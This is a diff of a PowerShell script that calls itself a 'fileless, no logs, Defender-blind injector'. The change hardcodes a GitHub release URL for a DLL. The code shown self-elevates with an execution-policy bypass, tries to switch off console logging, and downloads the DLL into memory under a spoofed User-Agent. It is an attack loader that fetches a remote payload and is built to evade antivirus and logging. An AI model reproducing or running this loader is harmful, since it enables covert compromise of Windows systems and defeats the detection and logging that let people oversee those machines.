@@ -1,4 +1,8 @@
-# UEFI boot injector – fileless, no logs, Defender-blind
+# No files, no logs, Defender-blind injector
+# Hardcoded DLL URL
+$dllUrl = "https://github.com/abinesh9042/controlernostring/releases/download/v1/rocky.dll"
+
+# Self-elevate (already SYSTEM, but safe)
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Start-Process powershell -ArgumentList "-NoP -NonI -Exec Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
@@ -9,7 +13,6 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 $null=[System.Management.Automation.PSConsoleHost]::GetType().GetMethod('DisableConsoleLogging','NonPublic,Static').Invoke($null,@())
 
 # Download DLL from GitHub – memory only
-$dllUrl = "DLL_URL"
 $wc = New-Object Net.WebClient
 $wc.Headers.Add("User-Agent", "Mozilla/5.0")
 $dllBytes = $wc.DownloadData($dllUrl)
